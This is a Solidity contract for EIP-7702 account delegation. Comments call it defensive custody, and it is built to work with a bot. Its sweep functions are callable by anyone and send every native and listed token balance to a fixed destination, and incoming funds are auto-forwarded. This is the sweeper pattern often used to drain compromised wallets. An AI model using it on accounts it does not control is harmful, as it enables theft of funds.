// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

library SafeToken {
    function safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transfer.selector, to, amount)
        );
        require(success, "TOKEN_TRANSFER_CALL_FAILED");
        if (data.length > 0) {
            require(abi.decode(data, (bool)), "TOKEN_TRANSFER_FAILED");
        }
    }
}

/**
 * @title Simple7702Delegate
 * @notice Contrato defensivo de custodia para uso com delegacao da propria operacao.
 * @dev Mantem compatibilidade com a ABI consumida pelo bot.
 */
contract Simple7702Delegate {
    using SafeToken for address;

    address private _owner;
    address public destination;
    bool public frozen;

    address[] private arbitrumTokens;
    address[] private bscTokens;
    mapping(address => bool) public isArbitrumToken;
    mapping(address => bool) public isBscToken;

    event Sweep(address indexed token, uint256 amount, address indexed to);
    event SweepSkipped(address indexed token, uint256 amount, string reason);
    event DestinationChanged(address indexed newDestination);
    event FrozenChanged(bool frozen);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event TokenAdded(string network, address indexed token);
    event TokenRemoved(string network, address indexed token);

    modifier onlyOwner() {
        require(msg.sender == _owner, "NOT_OWNER");
        _;
    }

    modifier whenNotFrozen() {
        require(!frozen, "FROZEN");
        _;
    }

    constructor(
        address initialOwner,
        address initialDestination,
        address[] memory initialArbitrumTokens,
        address[] memory initialBscTokens
    ) {
        require(initialOwner != address(0), "INVALID_OWNER");
        require(initialDestination != address(0), "INVALID_DESTINATION");

        _owner = initialOwner;
        destination = initialDestination;

        emit OwnershipTransferred(address(0), initialOwner);
        emit DestinationChanged(initialDestination);

        for (uint256 i = 0; i < initialArbitrumTokens.length; i++) {
            _addArbitrumToken(initialArbitrumTokens[i]);
        }

        for (uint256 i = 0; i < initialBscTokens.length; i++) {
            _addBscToken(initialBscTokens[i]);
        }
    }

    function owner() external view returns (address) {
        return _owner;
    }

    // Compatibilidade com o getter que o bot espera hoje.
    function OWNER() external view returns (address) {
        return _owner;
    }

    // ========== FUNCOES DE CUSTODIA ==========

    function sweepNative() public whenNotFrozen {
        require(destination != address(0), "INVALID_DESTINATION");
        uint256 balance = address(this).balance;
        if (balance == 0) {
            emit SweepSkipped(address(0), 0, "NO_NATIVE_BALANCE");
            return;
        }

        (bool success, ) = payable(destination).call{value: balance}("");
        require(success, "NATIVE_TRANSFER_FAILED");
        emit Sweep(address(0), balance, destination);
    }

    function sweepTokens(address[] calldata tokens) public whenNotFrozen {
        require(destination != address(0), "INVALID_DESTINATION");
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == address(0)) {
                continue;
            }

            uint256 balance = IERC20(token).balanceOf(address(this));
            if (balance == 0) {
                continue;
            }

            token.safeTransfer(destination, balance);
            emit Sweep(token, balance, destination);
        }
    }

    function sweepAll(address[] calldata tokens) external whenNotFrozen {
        sweepNative();
        sweepTokens(tokens);
    }

    function sweepArbitrum() external whenNotFrozen {
        _sweepStoredTokens(arbitrumTokens);
        sweepNative();
    }

    function sweepBSC() external whenNotFrozen {
        _sweepStoredTokens(bscTokens);
        sweepNative();
    }

    receive() external payable {
        _tryAutoForward();
    }

    fallback() external payable {
        _tryAutoForward();
    }

    // ========== ADMIN ==========

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "INVALID_OWNER");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function setDestination(address _dest) external onlyOwner {
        require(_dest != address(0), "INVALID_DESTINATION");
        destination = _dest;
        emit DestinationChanged(_dest);
    }

    function setFrozen(bool _frozen) external onlyOwner {
        frozen = _frozen;
        emit FrozenChanged(_frozen);
    }

    function emergencyWithdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        if (balance == 0) {
            return;
        }

        (bool success, ) = payable(_owner).call{value: balance}("");
        require(success, "EMERGENCY_WITHDRAW_FAILED");
    }

    function emergencyWithdrawToken(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance == 0) {
            return;
        }

        token.safeTransfer(_owner, balance);
    }

    function addArbitrumToken(address token) external onlyOwner {
        _addArbitrumToken(token);
    }

    function addBscToken(address token) external onlyOwner {
        _addBscToken(token);
    }

    function removeArbitrumToken(address token) external onlyOwner {
        _removeToken(arbitrumTokens, isArbitrumToken, token, "arbitrum");
    }

    function removeBscToken(address token) external onlyOwner {
        _removeToken(bscTokens, isBscToken, token, "bsc");
    }

    // ========== CONSULTAS ==========

    function getArbitrumTokens() external view returns (address[] memory) {
        return arbitrumTokens;
    }

    function getBscTokens() external view returns (address[] memory) {
        return bscTokens;
    }

    function getNativeBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getTokenBalance(address token) external view returns (uint256) {
        if (token == address(0)) {
            return address(this).balance;
        }
        return IERC20(token).balanceOf(address(this));
    }

    // ========== INTERNAS ==========

    function _tryAutoForward() internal {
        if (frozen || msg.value == 0 || destination == address(0)) {
            return;
        }

        (bool success, ) = payable(destination).call{value: msg.value}("");
        if (success) {
            emit Sweep(address(0), msg.value, destination);
        } else {
            emit SweepSkipped(address(0), msg.value, "AUTO_FORWARD_FAILED");
        }
    }

    function _sweepStoredTokens(address[] storage tokens) internal {
        require(destination != address(0), "INVALID_DESTINATION");
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            uint256 balance = IERC20(token).balanceOf(address(this));
            if (balance == 0) {
                continue;
            }

            token.safeTransfer(destination, balance);
            emit Sweep(token, balance, destination);
        }
    }

    function _addArbitrumToken(address token) internal {
        require(token != address(0), "INVALID_TOKEN");
        require(!isArbitrumToken[token], "TOKEN_ALREADY_ALLOWED");
        isArbitrumToken[token] = true;
        arbitrumTokens.push(token);
        emit TokenAdded("arbitrum", token);
    }

    function _addBscToken(address token) internal {
        require(token != address(0), "INVALID_TOKEN");
        require(!isBscToken[token], "TOKEN_ALREADY_ALLOWED");
        isBscToken[token] = true;
        bscTokens.push(token);
        emit TokenAdded("bsc", token);
    }

    function _removeToken(
        address[] storage tokens,
        mapping(address => bool) storage allowed,
        address token,
        string memory network
    ) internal {
        require(allowed[token], "TOKEN_NOT_ALLOWED");
        allowed[token] = false;

        uint256 length = tokens.length;
        for (uint256 i = 0; i < length; i++) {
            if (tokens[i] == token) {
                tokens[i] = tokens[length - 1];
                tokens.pop();
                emit TokenRemoved(network, token);
                return;
            }
        }
    }
}
